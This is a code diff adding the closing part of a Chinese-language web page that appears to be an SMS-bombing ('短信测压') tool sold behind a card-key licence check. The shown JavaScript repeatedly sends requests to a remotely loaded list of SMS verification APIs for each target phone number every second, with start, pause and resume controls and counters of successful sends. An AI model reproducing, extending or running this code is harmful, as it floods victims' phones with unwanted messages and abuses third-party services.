+                            appendLog((result.success ? '✅' : '❌') + ' ' + result.message, phone);
+                        } catch (e) {
+                            totalFail++;
+                            appendLog('❌ 异常: ' + e.message, phone);
+                        }
+                    }
+                }
+            };
+
+            // 立即发送第一轮
+            await sendOneRound();
+
+            // 启动定时器
+            if (sendTimer) {
+                clearInterval(sendTimer);
+                sendTimer = null;
+            }
+
+            sendTimer = setInterval(async () => {
+                elapsedSeconds++;
+                if (elapsedSeconds > totalSeconds) {
+                    clearInterval(sendTimer);
+                    sendTimer = null;
+                    isRunning = false;
+                    btnPause.style.display = 'none';
+                    btnStart.style.display = 'block';
+                    btnStart.textContent = '开始轰炸';
+                    statusBar.textContent = '✅ 轰炸完成！成功 ' + totalSuccess + ' 次，失败 ' + totalFail + ' 次';
+                    statusBar.className = 'status-bar done';
+                    showToast('轰炸完成');
+                    return;
+                }
+
+                await sendOneRound();
+
+                statusBar.textContent = '⏳ 已运行 ' + elapsedSeconds + ' 秒，成功 ' + totalSuccess + ' 次，失败 ' + totalFail +
+                    ' 次';
+                statusBar.className = 'status-bar running';
+            }, 1000);
+        }
+
+        // ---- 暂停/继续 ----
+        // 修复暂停逻辑，支持继续时恢复定时器
+        btnPause.onclick = function() {
+            if (!isRunning) return;
+            if (isPaused) {
+                // 继续
+                isPaused = false;
+                btnPause.textContent = '暂停';
+                statusBar.textContent = '▶️ 轰炸继续中...';
+                statusBar.className = 'status-bar running';
+                showToast('继续轰炸');
+                // 重新建立定时器
+                continueBombing();
+            } else {
+                // 暂停
+                isPaused = true;
+                btnPause.textContent = '继续';
+                statusBar.textContent = '⏸️ 轰炸已暂停';
+                statusBar.className = 'status-bar';
+                showToast('已暂停');
+                if (sendTimer) {
+                    clearInterval(sendTimer);
+                    sendTimer = null;
+                }
+            }
+        };
+
+        async function continueBombing() {
+            if (!isRunning || !isPaused) return;
+            let apis = g_cachedApis;
+            if (!apis || apis.length === 0) {
+                try {
+                    apis = await loadAPIsFromQQLink();
+                } catch (e) {
+                    statusBar.textContent = '❌ 接口加载失败';
+                    return;
+                }
+            }
+            let phones = targetPhones.length > 0 ? targetPhones.slice() : [phoneInput.value.trim()];
+            if (phones.length === 0 || (phones.length === 1 && !phones[0])) {
+                statusBar.textContent = '❌ 无有效号码';
+                return;
+            }
+
+            const sendOneRound = async () => {
+                for (const phone of phones) {
+                    for (const api of apis) {
+                        try {
+                            const result = await sendRequestWithAPI(api, phone);
+                            if (result.success) totalSuccess++;
+                            else totalFail++;
+                            appendLog((result.success ? '✅' : '❌') + ' ' + result.message, phone);
+                        } catch (e) {
+                            totalFail++;
+                            appendLog('❌ 异常: ' + e.message, phone);
+                        }
+                    }
+                }
+            };
+
+            // 立即发送一轮
+            await sendOneRound();
+
+            // 启动定时器
+            if (sendTimer) {
+                clearInterval(sendTimer);
+                sendTimer = null;
+            }
+
+            sendTimer = setInterval(async () => {
+                elapsedSeconds++;
+                if (elapsedSeconds > totalSeconds) {
+                    clearInterval(sendTimer);
+                    sendTimer = null;
+                    isRunning = false;
+                    btnPause.style.display = 'none';
+                    btnStart.style.display = 'block';
+                    btnStart.textContent = '开始轰炸';
+                    statusBar.textContent = '✅ 轰炸完成！成功 ' + totalSuccess + ' 次，失败 ' + totalFail + ' 次';
+                    statusBar.className = 'status-bar done';
+                    showToast('轰炸完成');
+                    return;
+                }
+
+                await sendOneRound();
+
+                statusBar.textContent = '⏳ 已运行 ' + elapsedSeconds + ' 秒，成功 ' + totalSuccess + ' 次，失败 ' + totalFail +
+                    ' 次';
+                statusBar.className = 'status-bar running';
+            }, 1000);
+        }
+
+        // ---- 启动应用 ----
+        async function bootstrap() {
+            // 检测公益开关
+            try {
+                const text = await fetchQQPlainText(QQ_COLLECTION_URL);
+                if (text && text.includes('123456789')) {
+                    // 显示公益页，点击确定后直接进入主界面（已绑定事件）
+                    showPage('page-welfare');
+                    return;
+                }
+            } catch (e) {
+                // 忽略错误，走正常流程
+            }
+
+            // 未触发公益，显示卡密验证
+            showPage('page-verify');
+            const saved = localStorage.getItem(SAVED_CARD_KEY);
+            if (saved) {
+                cardInput.value = saved;
+                // 自动验证
+                setTimeout(doVerify, 300);
+            }
+        }
+
+        // ---- 启动 ----
+        bootstrap();
+
+        console.log('💣 短信测压已启动');
+        console.log('TG: ' + TG_URL);
+    </script>
+
+</body>
+</html>
